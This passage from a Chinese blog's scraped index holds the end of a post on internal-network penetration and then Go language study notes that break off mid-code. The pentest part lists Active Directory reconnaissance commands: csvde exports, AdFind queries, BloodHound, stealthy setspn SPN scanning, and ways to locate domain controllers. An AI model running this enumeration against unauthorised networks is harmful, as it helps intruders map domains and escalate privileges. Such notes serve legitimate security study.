c:\\windows\\temp\\e.csv -n -s 192.168.1.100（DC的IP） -b &lt;域用户名&gt; &lt;域名&gt; &lt;域用户密码&gt;如果你可以使用域成员主机的system权限或者当前就在DC上csvde.exe -f c:\\windows\\temp\\e.csv -n -s 192.168.1.100（DC的IP) 导出域内dns记录sharpadidnsdump普通域用户即可 https://github.com/b4rtik/SharpAdidnsdump 域渗透——普通用户权限获得DNS记录 (3gstudent.github.io) dnscmd域管权限，域控自带 域渗透——DNS记录的获取 (3gstudent.github.io) AdFindC++实现(未开源)，用于查询域内信息 http://www.joeware.net/freetools/tools/adfind/index.htm 常用命令如下： 12345678910111213141.列出域控制器名称AdFind -sc dclist2.查询当前域中在线的计算机AdFind -sc computers_active3.查询当前域中在线的计算机(只显示名称和操作系统)AdFind -sc computers_active name operatingSystem4.查询当前域中所有计算机AdFind -f &quot;objectcategory=computer&quot;5.查询当前域中所有计算机(只显示名称和操作系统)AdFind -f &quot;objectcategory=computer&quot; name operatingSystem6.查询域内所有用户AdFind -users name7.查询所有GPOAdFind -sc gpodmp Bloodhound/SharphoundBloodHound以用图与线的形式，将域内用户、计算机、组、Sessions、ACLs以及域内所有相关用户、组、计算机、登陆信息、访问控制策略之间的关系更直观的展现在Red Team面前进行更便捷的分析域内情况，更快速的在域内提升自己的权限。它也可以使Blue Team成员对己方网络系统进行更好的安全检测及保证域的安全性。这里直接介绍需要在内网机器中执行的相关命令：此工具的导出相对来说比较暴力，且目前此工具 exe 原版已经被识别并被各种杀软查杀，包括微软win10自带的杀软 Windows Defender 。 详细参考： https://www.anquanke.com/post/id/214046 SPN扫描不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。大部分win系统默认已自带spn探测工具即：setspn.exe，此操作无需管理权限，需域内机器执行。 1setspn -T target.com -Q */* 可完整查出当前域内所有spn 详细介绍：域安全-SPN扫描 ldapsearch详细介绍：渗透基础——活动目录信息的获取 定位域控查询dns解析记录若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。 12345678910111213C:\\Users\\xingzheng&gt;nslookup -type=all _ldap._tcp.dc._msdcs.hack7.localDNS request timed out. timeout was 2 seconds.服务器: UnKnownAddress: 192.168.86.109_ldap._tcp.dc._msdcs.hack7.local SRV service location: priority = 0 weight = 100 port = 389 svr hostname = dc.hack7.localdc.hack7.local internet address = 192.168.86.109 SPN扫描在SPN扫描结果中可以通过如下内容，来进行域控的定位。 1CN=DC,OU=Domain Controllers,DC=hack7,DC=loca net group1234567891011C:\\Users\\xingzheng&gt;net group &quot;domain controllers&quot; /domain这项请求将在域 hack7.local 的域控制器处理。组名 Domain Controllers注释 域中所有域控制器成员-------------------------------------------------------------------------------DC$命令成功完成。 端口识别扫描内网中同时开放389和53端口的机器。 12345678端口：389服务：LDAP、ILS说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。端口：53服务：Domain Name Server（DNS）说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。端口：88服务：Kerberros安全认证系统","link":"/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"title":"Go语言学习笔记","text":"参考（Ctrl c+v） https://www.kancloud.cn/kancloud/the-way-to-go/ 当个学习笔记，只记录重点。 初始平台与架构Go 语言开发团队开发了适用于以下操作系统的编译器： Linux FreeBSD Mac OS X（也称为 Darwin） 目前有2个版本的编译器：Go 原生编译器 gc 和非原生编译器 gccgo，这两款编译器都是在类 Unix 系统下工作 。其中，gc 版本的编译器已经被移植到 Windows 平台上，并集成在主要发行版中，你也可以通过安装 MinGW 从而在 Windows 平台下使用 gcc 编译器。这两个编译器都是以单通道的形式工作。 你可以获取以下平台上的 Go 1.4 源码和二进制文件： Linux 2.6+：amd64、386 和 arm 架构 Mac OS X（Snow Leopard + Lion）：amd64 和 386 架构 Windows 2000+：amd64 和 386 架构 Go 环境变量 $GOROOT 表示 Go 在你的电脑上的安装位置，它的值一般都是 $HOME/go，当然，你也可以安装在别的地方。 $GOARCH 表示目标机器的处理器架构，它的值可以是 386、amd64 或 arm。 $GOOS 表示目标机器的操作系统，它的值可以是 darwin、freebsd、linux 或 windows。 $GOBIN 表示编译器和链接器的安装位置，默认是 $GOROOT/bin，如果你使用的是 Go 1.0.3 及以后的版本，一般情况下你可以将它的值设置为空，Go 将会使用前面提到的默认值。 安装目录清单 /bin：包含可执行文件，如：编译器，Go 工具 /doc：包含示例程序，代码工具，本地文档等 /lib：包含文档模版 /misc：包含与支持 Go 编辑器有关的配置文件以及 cgo 的示例 /os_arch：包含标准库的包的对象文件（.a） /src：包含源代码构建脚本和标准库的包的完整源代码（Go 是一门开源语言） /src/cmd：包含 Go 和 C 的编译器和命令行脚本 Go调试器 在合适的位置使用打印语句输出相关变量的值（print/println 和 fmt.Print/fmt.Println/fmt.Printf）。 在 fmt.Printf 中使用下面的说明符来打印有关变量的相关信息： %+v 打印包括字段在内的实例的完整信息 %#v 打印包括字段和限定类型名称在内的实例的完整信息 %T 打印某个类型的完整说明 使用 panic 语句（第 13.2 节）来获取栈跟踪信息（直到 panic 时所有被调用函数的列表）。 使用关键字 defer 来跟踪代码执行过程（第 6.4 节）。 构建并运行 Go 程序在大多数 IDE 中，每次构建程序之前都会自动调用源码格式化工具 gofmt 并保存格式化后的源文件。如果构建成功则不会输出任何信息，而当发生编译时错误时，则会指明源码中具体第几行出现了什么错误，如：a declared and not used。一般情况下，你可以双击 IDE 中的错误信息直接跳转到发生错误的那一行。 如果程序执行一切顺利并成功退出后，将会在控制台输出 Program exited with code 0。 从 Go 1 版本开始，使用 Go 自带的更加方便的工具来构建应用程序： go build 编译并安装自身包和依赖包 go install 安装自身包和依赖包 语言的核心结构与技术基本结构和基本数据类型hello world123456789package mainimport ( &quot;fmt&quot;)func main() { fmt.Println(&quot;hello, world&quot;)} 包的概念包是结构化代码的一种方式：每个程序都由包（通常简称为 pkg）的概念组成，可以使用自身的包或者从其它包中导入内容。 package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。 所有的包名都应该使用小写字母。 注释 // 单行注释 /* xxxx */ 多行注释 函数你可以在括号 () 中写入 0 个或多个函数的参数（使用逗号 , 分隔），每个参数的名称后面必须紧跟着该参数的类型。 1func Sum(a, b int) int { return a + b } 类型基本类型：int、float、bool、string 结构化的（复合的）：struct、array、slice、map、channel 结构化的类型没有真正的值，它使用nil作为默认值 类型转换类型 B 的值 = 类型 B(类型 A 的值) 1valueOfTypeB = typeB(valueOfTypeA) 常量123456const beef, two, c = “meat”, 2, “veg”const Monday, Tuesday, Wednesday, Thursday, Friday, Saturday = 1, 2, 3, 4, 5, 6const ( Monday, Tuesday, Wednesday = 1, 2, 3 Thursday, Friday, Saturday = 4, 5, 6) 变量声明变量时将变量的 类型 放在变量的 名称之后 1234567891011121314151617var identifier type多行根据变量的值来自动推断其类型var ( a = 15 b = false str = &quot;Go says hello to the world!&quot; numShips = 50 city string)并行\\同时赋值a, b, c = 5, 7, &quot;abc&quot;值交换a, b = b, a 变量的 命名规则 遵循骆驼命名法，即首个单词小写，每个新单词的首字母大写，例如：numShips 和 startDate 一个变量（常量、类型或函数）在程序中都有一定的作用范围，称之为作用域。 如果一个变量在函数体外声明，则被认为是全局变量，可以在整个包、外部包（被导出后）使用，不管你声明在哪个源文件里或在哪个源文件里调用该变量。 在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。 打印函数 fmt.Print 和 fmt.Println 会自动使用格式化标识符 %v 对字符串进行格式化，两者都会在每个参数之间自动增加空格，而后者还会在字符串的最后加上一个换行符。例如： 123fmt.Print(&quot;Hello:&quot;, 23)将输出：Hello: 23 init 函数变量除了可以在全局声明中初始化，也可以在 init 函数中初始化。 不能够被人为调用，而是在每个包完成初始化后自动执行，并且执行优先级比 main 函数高。 一个源文件都可以包含且只包含一个 init 函数。初始化总是以单线程执行，并且按照包的依赖关系顺序执行。 init.go 123456789package transimport &quot;math&quot;var Pi float64func init() { Pi = 4 * math.Atan(1) // init() function computes Pi} user_init.go 中导入了包 trans（在相同的路径中）并且使用到了变量 Pi 123456789101112package mainimport ( &quot;fmt&quot; &quot;./trans&quot;)var twoPi = 2 * trans.Pifunc main() { fmt.Printf(&quot;2*Pi = %g\\n&quot;, twoPi) // 2*Pi = 6.283185307179586} 基本类型和运算符布尔类型 bool：布尔型的值只可以是常量 true 或者 false 数字类型：整型 int 和浮点型 float 格式化说明符：格式化字符串里，%d 用于格式化整数（%x 和 %X 用于格式化 16 进制表示的数字），%g 用于格式化浮点型（%f 输出浮点数，%e 输出科学计数表示法），%0d 用于规定输出定长的整数，其中开头的数字 0 是必须的。 数字值转换：进行a32bitInt = int32(a32Float) 的转换时，小数点后的数字将被丢弃。 复数：Go 拥有以下复数类型： 12complex64 (32 位实数和虚数)complex128 (64 位实数和虚数) 位运算： 一元运算符：按位补足 ^，位左移 &lt;&lt;，位右移 &gt;&gt; 二元运算符：按位与 &amp;，按位或 |，按位异或 ^，位清除 &amp;^ 逻辑运算符：== , != , &lt; , &lt;= , &gt; , &gt;= 算术运算符：常见可用于整数和浮点数的二元运算符有 +、-、* 和 /。 运算符与优先级： 有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低： 12345678优先级 运算符 7 ^ ! 6 * / % &lt;&lt; &gt;&gt; &amp; &amp;^ 5 + - | ^ 4 == != &lt; &lt;= &gt;= &gt; 3 &lt;- 2 &amp;&amp; 1 || 当然，你可以通过使用括号来临时提升某个表达式的整体运算优先级。 类型别名： 1type TZ int 字符类型：char.go 12345678910111213var ch int = '\\u0041'var ch2 int = '\\u03B2'var ch3 int = '\\U00101234'fmt.Printf(&quot;%d - %d - %d\\n&quot;, ch, ch2, ch3) // integerfmt.Printf(&quot;%c - %c - %c\\n&quot;, ch, ch2, ch3) // characterfmt.Printf(&quot;%X - %X - %X\\n&quot;, ch, ch2, ch3) // UTF-8 bytesfmt.Printf(&quot;%U - %U - %U&quot;, ch, ch2, ch3) // UTF-8 code point输出：65 - 946 - 1053236A - β - r41 - 3B2 - 101234U+0041 - U+03B2 - U+101234 字符串string 类型的零值为长度为零的字符串，即空字符串 &quot;&quot;。 一般的比较运算符（==、!=、&lt;、&lt;=、&gt;=、&gt;）通过在内存中按字节比较来实现字符串的对比。你可以通过函数len() 来获取字符串所占的字节长度，例如：len(str)。 字符串拼接符 +：两个字符串 s1 和 s2 可以通过 s := s1 + s2 、s += &quot;world&quot; 拼接在一起。 解释字符串： 该类字符串使用双引号括起来，其中的相关的转义字符将被替换，这些转义字符包括： \\n：换行符 \\r：回车符 \\t：tab 键 \\u 或 \\U：Unicode 字符 \\\\：反斜杠自身 非解释字符串： 该类字符串使用反引号括起来，支持换行，例如： 1`This is a raw string \\n` 中的 `\\n\\` 会被原样输出。 时间和日期123456789101112131415161718192021222324252627package mainimport ( &quot;fmt&quot; &quot;time&quot;)var week time.Durationfunc main() { t := time.Now() fmt.Println(t) // e.g. Wed Dec 21 09:52:14 +0100 RST 2011 fmt.Printf(&quot;%02d.%02d.%4d\\n&quot;, t.Day(), t.Month(), t.Year()) // 21.12.2011 t = time.Now().UTC() fmt.Println(t) // Wed Dec 21 08:52:14 +0000 UTC 2011 fmt.Println(time.Now()) // Wed Dec 21 09:52:14 +0100 RST 2011 // calculating times: week = 60 * 60 * 24 * 7 * 1e9 // must be in nanosec week_from_now := t.Add(week) fmt.Println(week_from_now) // Wed Dec 28 08:52:14 +0000 UTC 2011 // formatting times: fmt.Println(t.Format(time.RFC822)) // 21 Dec 11 0852 UTC fmt.Println(t.Format(time.ANSIC)) // Wed Dec 21 08:56:34 2011 fmt.Println(t.Format(&quot;02 Jan 2006 15:04&quot;)) // 21 Dec 2011 08:52 s := t.Format(&quot;20060102&quot;) fmt.Println(t, &quot;=&gt;&quot;, s) // Wed Dec 21 08:52:14 +0000 UTC 2011 =&gt; 20111221} 指针程序在内存中存储它的值，每个内存块（或字）有一个地址，通常用十六进制数表示，如：0x6b0820 或0xf84001d7f0。 一个指针变量可以指向任何一个值的内存地址 它指向那个值的内存地址，在 32 位机器上占用 4 个字节，在 64 位机器上占用 8 个字节，并且与它所指向的值的大小无关。 Go 语言的取地址符是 &amp;，放到一个变量前使用就会返回相应变量的内存地址。 指针类型前面加上*号（前缀）来获取指针所指向的内容，这里的 * 号是一个类型更改器。使用一个指针引用一个值被称为间接引用。 当一个指针被定义后没有分配到任何变量时，它的值为 nil。 一个指针变量通常缩写为 ptr。 例：展示了分配一个新的值给 *p 并且更改这个变量自己的值（这里是一个字符串） 123456789101112131415package mainimport &quot;fmt&quot;func main() { s := &quot;good bye&quot; var p *string = &amp;s *p = &quot;ciao&quot; fmt.Printf(&quot;Here is the pointer p: %p\\n&quot;, p) // prints address fmt.Printf(&quot;Here is the string *p: %s\\n&quot;, *p) // prints string fmt.Printf(&quot;Here is the string s: %s\\n&quot;, s) // prints same string}输出：Here is the pointer p: 0x2540820Here is the string *p: ciaoHere is the string s: ciao 控制结构if-else 结构123456789101112131415161718192021222324if condition1 { // do something } else if condition2 { // do something else }else { // catch-all or default}判断一个字符串是否为空if str == &quot;&quot; { ... }if len(str) == 0 {...}判断系统，分别提示var prompt = &quot;Enter a digit, e.g. 3 &quot;+ &quot;or %s to quit.&quot;func init() { if runtime.GOOS == &quot;windows&quot; { prompt = fmt.Sprintf(prompt, &quot;Ctrl+Z, Enter&quot;) } else { //Unix-like prompt = fmt.Sprintf(prompt, &quot;Ctrl+D&quot;) }} switch 结构12345678switch { case condition1: ... case condition2: ... default: ...} for结构基于计数器的迭代123456789package mainimport &quot;fmt&quot;func main() { for i := 0; i &lt; 5; i++ { fmt.Printf(&quot;This is the %d iteration\\n&quot;, i) }} for-range 结构它可以迭代任何一个集合（包括数组和 map)，一般形式为：for ix, val := range coll { }。 val 始终为集合中对应索引的值拷贝，因此它一般只具有只读性质，对它所做的任何修改都不会影响到集合中原有的值（译者注：如果 val 为指针，则会产生指针的拷贝，依旧可以修改集合中的原值） 123for pos, char := range str {...} Break 与 continuebreak 的作用范围为该语句出现后的最内部的结构，它可以被用于任何形式的 for 循环（计数器、条件判断等）。但在 switch 或 select 语句中，break 语句的作用结果是跳过整个代码块，执行后续的代码。 continue 忽略剩余的循环体而直接进入下一次循环的过程，但不是无条件执行下一次循环，执行之前依旧需要满足循环的判断条件。 标签与 gotofor、switch 或 select 语句都可以配合标签（label）形式的标识符使用，即某一行第一个以冒号（:）结尾的单词（gofmt 会将后续代码自动移至下一行）。 123456789LABEL1: for i := 0; i &lt;= 5; i++ { for j := 0; j &lt;= 5; j++ { if j == 4 { continue LABEL1 } fmt.Printf(&quot;i is: %d, and j is: %d\\n&quot;, i, j) } } 函数（function）函数参数与返回值按值\\引用传递12345678910111213141516171819package mainimport &quot;fmt&quot;func main() { fmt.Printf(&quot;Multiply 2 * 5 * 6 = %d\\n&quot;, MultiPly3Nums(2, 5, 6)) // var i1 int = MultiPly3Nums(2, 5, 6) // fmt.Printf(&quot;MultiPly 2 * 5 * 6 = %d\\n&quot;, i1)}func MultiPly3Nums(a int, b int, c int) int { // var product int = a * b * c // return product return a * b * c}输出显示：Multiply 2 * 5 * 6 = 60 命名的返回值getX2AndX3 与 getX2AndX3_2 两个函数演示了如何使用非命名返回值与命名返回值的特性。当需要返回多个非命名返回值时，需要使用 () 把它们括起来，比如 (int, int)。 12345678910111213141516171819202122232425262728package mainimport &quot;fmt&quot;var num int = 10var numx2, numx3 intfunc main() { numx2, numx3 = getX2AndX3(num) PrintValues() //输出：num = 10, 2x num = 20, 3x num = 30 numx2, numx3 = getX2AndX3_2(num) PrintValues() //输出：num = 10, 2x num = 20, 3x num = 30 }func PrintValues() { fmt.Printf(&quot;num = %d, 2x num = %d, 3x num = %d\\n&quot;, num, numx2, numx3)}func getX2AndX3(input int) (int, int) { return 2 * input, 3 * input}func getX2AndX3_2(input int) (x2 int, x3 int) { x2 = 2 * input x3 = 3 * input // return x2, x3 return} 空白符空白符用来匹配一些不需要的值，然后丢弃掉。ThreeValues 是拥有三个返回值的不需要任何参数的函数，在下面的例子中，我们将第一个与第三个返回值赋给了 i1 与f1。第二个返回值赋给了空白符 _，然后自动丢弃掉。 1234567891011121314package mainimport &quot;fmt&quot;func main() { var i1 int var f1 float32 i1, _, f1 = ThreeValues() fmt.Printf(&quot;The int: %d, the float: %f \\n&quot;, i1, f1) //输出：The int: 5, the float: 7.500000}func ThreeValues() (int, int, float32) { return 5, 6, 7.5} 改变外部变量传递指针给函数不但可以节省内存（因为没有复制变量的值），而且赋予了函数直接修改外部变量的能力，所以被修改的变量不再需要使用 return 返回。如下的例子，reply 是一个指向 int 变量的指针，通过这个指针，我们在函数内修改了这个 int 变量的数值。 1234567891011121314151617package mainimport ( &quot;fmt&quot;)// this function changes reply:func Multiply(a, b int, reply *int) { *reply = a * b}func main() { n := 0 reply := &amp;n Multiply(10, 5, reply) fmt.Println(&quot;Multiply:&quot;, *reply) // Multiply: 50} 传递变长参数如果函数的最后一个参数是采用 ...type 的形式，那么这个函数就可以处理一个变长的参数，这个长度可以为 0，这样的函数称为变参函数。 示例函数和调用： 12func Greeting(prefix string, who ...string)Greeting(&quot;hello:&quot;, &quot;Joe&quot;, &quot;Anna&quot;, &quot;Eileen&quot;) 在 Greeting 函数中，变量 who 的值为 []string{&quot;Joe&quot;, &quot;Anna&quot;, &quot;Eileen&quot;}。 如果参数被存储在一个数组 arr 中，则可以通过 arr... 的形式来传递参数调用变参函数。 123456789101112131415161718192021222324package mainimport &quot;fmt&quot;func main() { x := Min(1, 3, 2, 0) fmt.Printf(&quot;The minimum is: %d\\n&quot;, x) // 输出：The minimum is: 0 arr := []int{7,9,3,5,1} x = Min(arr...) fmt.Printf(&quot;The minimum in the array arr is: %d&quot;, x) // 输出：The minimum in the array arr is: 1}func Min(a ...int) int { if len(a)==0 { return 0 } min := a[0] for _, v := range a { if v &lt; min { min = v } } return min} defer 和追踪https://www.kancloud.cn/kancloud/the-way-to-go/72476 关键字 defer 允许我们推迟到函数返回之前（或任意位置执行 return 语句之后）一刻才执行某个语句或函数（为什么要在返回之后才执行这些语句？因为 return 语句同样可以包含一些操作，而不是单纯地返回某个值）。 关键字 defer 的用法类似于面向对象编程语言 Java 和 C# 的 finally 语句块，它一般用于释放某些已分配的资源。 当有多个 defer 行为被注册时，它们会以逆序执行（类似栈，即后进先出） 可以使用 defer 语句实现代码追踪 内置函数 名称 说明 close 用于管道通信 len、cap len 用于返回某个类型的长度或数量（字符串、数组、切片、map 和管道）；cap 是容量的意思，用于返回某个类型的最大容量（只能用于切片和 map） new、make new 和 make 均是用于分配内存：new 用于值类型和用户定义的类型，如自定义结构，make 用户内置引用类型（切片、map 和管道）。它们的用法就像是函数，但是将类型作为参数：new(type)、make(type)。new(T) 分配类型 T 的零值并返回其地址，也就是指向类型 T 的指针（详见第 10.1 节）。它也可以被用于基本类型：v := new(int)。make(T) 返回类型 T 的初始化之后的值，因此它比 new 进行更多的工作（详见第 7.2.3/4 节、第 8.1.1 节和第 14.2.1 节）new() 是一个函数，不要忘记它的括号 copy、append 用于复制和连接切片 panic、recover 两者均用于错误处理机制 print、println 底层打印函数（详见第 4.2 节），在部署环境中建议使用 fmt 包 complex、real imag 用于创建和操作复数（详见第 4.5.2.2 节 递归函数当一个函数在其函数体内调用自身，则称之为递归。最经典的例子便是计算斐波那契数列，即每个数均为前两个数之和。数列如下所示： 11, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, … 12345678910111213141516171819202122232425262728293031323334package mainimport &quot;fmt&quot;func main() { result := 0 for i := 0; i &lt;= 10; i++ { result = fibonacci(i) fmt.Printf(&quot;fibonacci(%d) is: %d\\n&quot;, i, result) }}func fibonacci(n int) (res int) { if n &lt;= 1 { res = 1 } else { res = fibonacci(n-1) + fibonacci(n-2) } return}输出：fibonacci(0) is: 1fibonacci(1) is: 1fibonacci(2) is: 2fibonacci(3) is: 3fibonacci(4) is: 5fibonacci(5) is: 8fibonacci(6) is: 13fibonacci(7) is: 21fibonacci(8) is: 34fibonacci(9) is: 55fibonacci(10) is: 89 将函数作为参数函数可以作为其它函数的参数进行传递，然后在其它函数内调用执行，一般称之为回调 callback。 123456789101112131415161718192021package mainimport ( &quot;fmt&quot;)func main() { callback(1, Add)}func Add(a, b int) { fmt.Printf(&quot;The sum of %d and %d is: %d\\n&quot;, a, b, a+b)}func callback(y int, f func(int, int)) { f(y, 2) // this becomes Add(1, 2)}输出：The sum of 1 and 2 is: 3 闭包当我们不希望给函数起名字的时候，可以使用匿名函数，例如：func(x, y int) int { return x + y }。 这样的一个函数不能够独立存在（编译器会返回错误：non-declaration statement outside function body），但可以被赋值于某个变量，即保存函数的地址到变量中：fplus := func(x, y int) int { return x + y }，然后通过变量名对函数进行调用：fplus(3,4)。 当然，您也可以直接对匿名函数进行调用：func(x, y int) int { return x + y } (3, 4)。 应用闭包：将函数作为返回值https://www.kancloud.cn/kancloud/the-way-to-go/72481 1234567891011121314151617181920212223242526272829package mainimport &quot;fmt&quot;func main() { // make an Add2 function, give it a name p2, and call it: p2 := Add2() fmt.Printf(&quot;Call Add2 for 3 gives: %v\\n&quot;, p2(3)) // make a special Adder function, a gets value 3: TwoAdder := Adder(2) fmt.Printf(&quot;The result is: %v\\n&quot;, TwoAdder(3))}func Add2() func(b int) int { return func(b int) int { return b + 2 }}func Adder(a int) func(b int) int { return func(b int) int { return a + b }}输出：Call Add2 for 3 gives: 5The result is: 5 使用闭包调试能够准确地知道哪个文件中的具体哪个函数正在执行，对于调试是十分有帮助的。您可以使用 runtime 或 log 包中的特殊函数来实现这样的功能。包runtime 中的函数 Caller() 提供了相应的信息，因此可以在需要的时候实现一个 where() 闭包函数来打印函数执行的位置： 123456789where := func() { _, file, line, _ := runtime.Caller(1) log.Printf(&quot;%s:%d&quot;, file, line)}where()// some codewhere()// some more codewhere() 您也可以设置 log 包中的 flag 参数来实现： 12log.SetFlags(log.Llongfile)log.Print(&quot;&quot;) 或使用一个更加简短版本的 where 函数： 12345678var where = log.Printfunc func1() {where()... some codewhere()... some codewhere()} 计算函数执行时间在计算开始之前设置一个起始时候，再由计算结束时的结束时间，最后取出它们的差值，就是这个计算所消耗的时间。想要实现这样的做法，可以使用 time 包中的 Now() 和 Sub 函数： 12345start := time.Now()longCalculation()end := time.Now()delta := end.Sub(start)fmt.Printf(&quot;longCalculation took this amount of time: %s\\n&quot;, delta) 通过内存缓存来提升性能进行大量的计算时，提升性能最直接有效的一种方式就是避免重复计算。通过在内存中缓存和重复利用相同计算的结果，称之为内存缓存。最明显的例子就是生成斐波那契数列的程序 123456789101112131415161718192021222324252627282930313233343536package mainimport ( &quot;fmt&quot; &quot;time&quot;)const LIM = 41var fibs [LIM]uint64func main() { var result uint64 = 0 start := time.Now() for i := 0; i &lt; LIM; i++ { result = fibonacci(i) fmt.Printf(&quot;fibonacci(%d) is: %d\\n&quot;, i, result) } end := time.Now() delta := end.Sub(start) fmt.Printf(&quot;longCalculation took this amount of time: %s\\n&quot;, delta)}func fibonacci(n int) (res uint64) { // memoization: check if fibonacci(n) is already known in array: if fibs[n] != 0 { res = fibs[n] return } if n &lt;= 1 { res = 1 } else { res = fibonacci(n-1) + fibonacci(n-2) } fibs[n] = res return} 数组与切片声明和初始化数组数组元素可以通过 索引（位置）来读取（或者修改），索引从 0 开始，第一个元素索引为 0，第二个索引为 1，以此类推。（数组以 0 开始在所有类 C 语言中是相似的）。元素的数目，也称为长度或者数组大小必须是固定的并且在声明该数组时就给出（编译时需要知道数组长度以便分配内存）；数组长度最大为 2Gb。 声明的格式是： 12var identifier [len]typea := [...]string{&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;} 切片优点 因为切片是引用，所以它们不需要使用额外的内存并且比使用数组更有效率，所以在 Go 代码中 切片比数组更常用。 声明切片的格式是： var identifier []type（不需要说明长度）。 一个切片在未初始化之前默认为 nil，长度为 0。 切片的初始化格式是：var slice1 []type = arr1[start:end] 这表示 slice1 是由数组 arr1 从 start 索引到 end-1 索引之间的元素构成的子集（切分数组，start:end 被称为 slice 表达式）。所以 slice1[0] 就等于 arr1[start]。 For-range 结构这种构建方法可以应用与数组和切片: 123for ix, value := range slice1 { ...} 假设我们有如下数组：items := [...]int{10, 20, 30, 40, 50} 123for _, item := range items { item *= 2} 切片重组（reslice）切片可以反复扩展直到占据整个相关数组。 示例 7.11 reslicing.go 12345678910111213141516171819202122232425262728293031323334353637383940package mainimport &quot;fmt&quot;func main() { slice1 := make([]int, 0, 10) // load the slice, cap(slice1) is 10: for i := 0; i &lt; cap(slice1); i++ { slice1 = slice1[0:i+1] slice1[i] = i fmt.Printf(&quot;The length of slice is %d\\n&quot;, len(slice1)) } // print the slice: for i := 0; i &lt; len(slice1); i++ { fmt.Printf(&quot;Slice at %d is %d\\n&quot;, i, slice1[i]) }}输出结果：The length of slice is 1The length of slice is 2The length of slice is 3The length of slice is 4The length of slice is 5The length of slice is 6The length of slice is 7The length of slice is 8The length of slice is 9The length of slice is 10Slice at 0 is 0Slice at 1 is 1Slice at 2 is 2Slice at 3 is 3Slice at 4 is 4Slice at 5 is 5Slice at 6 is 6Slice at 7 is 7Slice at 8 is 8Slice at 9 is 9 切片的复制与追加如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。下面的代码描述了从拷贝切片的 copy 函数和向切片追加新元素的 append 函数。 123456789101112131415package mainimport &quot;fmt&quot;func main() { sl_from := []int{1, 2, 3} sl_to := make([]int, 10) n := copy(sl_to, sl_from) fmt.Println(sl_to) fmt.Printf(&quot;Copied %d elements\\n&quot;, n) // n == 3 sl3 := []int{1, 2, 3} sl3 = append(sl3, 4, 5, 6) fmt.Println(sl3)} 字符串、数组和切片的应用 7.6.1 从字符串生成字节切片 7.6.2 获取字符串的某一部分 7.6.3 字符串和切片的内存结构 7.6.4 修改字符串中的某个字符 7.6.5 字节数组对比函数 Compare 函数会返回两个字节数组字典顺序的整数对比结果 7.6.6 搜索及排序切片和数组 sort 包来实现常见的搜索和排序操作。 7.6.7 append 函数常见操作 我们在第 7.5 节提到的 append 非常有用，它能够用于各种方面的操作： 将切片 b 的元素追加到切片 a 之后：a = append(a, b...) 复制切片 a 的元素到新的切片 b 上： 12b = make([]T, len(a))copy(b, a) 删除位于索引 i 的元素：a = append(a[:i], a[i+1:]...) 切除切片 a 中从索引 i 至 j 位置的元素：a = append(a[:i], a[j:]...) 为切片 a 扩展 j 个元素长度：a = append(a, make([]T, j)...) 在索引 i 的位置插入元素 x：a = append(a[:i], append([]T{x}, a[i:]...)...) 在索引 i 的位置插入长度为 j 的新切片：a = append(a[:i], append(make([]T, j), a[i:]...)...) 在索引 i 的位置插入切片 b 的所有元素：a = append(a[:i], append(b, a[i:]...)...) 取出位于切片 a 最末尾的元素 x：x, a = a[len(a)-1], a[:len(a)-1] 将元素 x 追加到切片 a：a = append(a, x) 7.6.8 切片和垃圾回收 Mapmap 是一种特殊的数据结构：一种元素对（pair）的无序集合，pair 的一个元素是 key，对应的另一个元素是 value，所以这个结构也称为关联数组或字典。这是一种快速寻找值的理想结构：给定 key，对应的 value 可以迅速定位。 map 这种数据结构在其他编程语言中也称为字典（Python）、hash 和 HashTable 等。 声明、初始化和 makemap 是引用类型，可以使用如下声明： 12var map1 map[keytype]valuetypevar map1 map[string]int 123456789101112131415161718192021package mainimport &quot;fmt&quot;func main() { var mapLit map[string]int //var mapCreated map[string]float32 var mapAssigned map[string]int mapLit = map[string]int{&quot;one&quot;: 1, &quot;two&quot;: 2} mapCreated := make(map[string]float32) mapAssigned = mapLit mapCreated[&quot;key1&quot;] = 4.5 mapCreated[&quot;key2&quot;] = 3.14159 mapAssigned[&quot;two&quot;] = 3 fmt.Printf(&quot;Map literal at \\&quot;one\\&quot; is: %d\\n&quot;, mapLit[&quot;one&quot;]) fmt.Printf(&quot;Map created at \\&quot;key2\\&quot; is: %f\\n&quot;, mapCreated[&quot;key2&quot;]) fmt.Printf(&quot;Map assigned at \\&quot;two\\&quot; is: %d\\n&quot;, mapLit[&quot;two&quot;]) fmt.Printf(&quot;Map literal at \\&quot;ten\\&quot; is: %d\\n&quot;, mapLit[&quot;ten&quot;])} 测试键值对是否存在及删除元素如果你只是想判断某个 key 是否存在而不关心它对应的值到底是多少，你可以这么做： 1_, ok := map1[key1] // 如果key1存在则ok == true，否在ok为false 或者和 if 混合使用： 123if _, ok := map1[key1]; ok { // ...} for-range 的配套用法可以使用 for 循环构造 map： 123for key, value := range map1 { ...} 第一个返回值 key 是 map 中的 key 值，第二个返回值则是该 key 对应的 value 值；这两个都是仅 for 循环内部可见的局部变量。其中第一个返回值key值是一个可选元素。如果你只关心值，可以这么使用： 123for _, value := range map1 { ...} 如果只想获取 key，你可以这么使用： 123for key := range map1 { fmt.Printf(&quot;key is: %d\\n&quot;, key)} map 类型的切片假设我们想获取一个 map 类型的切片，我们必须使用两次 make() 函数，第一次分配切片，第二次分配 切片中每个 map 元素 1234567891011121314151617181920package mainimport &quot;fmt&quot;func main() { // Version A: items := make([]map[int]int, 5) for i:= range items { items[i] = make(map[int]int, 1) items[i][1] = 2 } fmt.Printf(&quot;Version A: Value of items: %v\\n&quot;, items) // Version B: NOT GOOD! items2 := 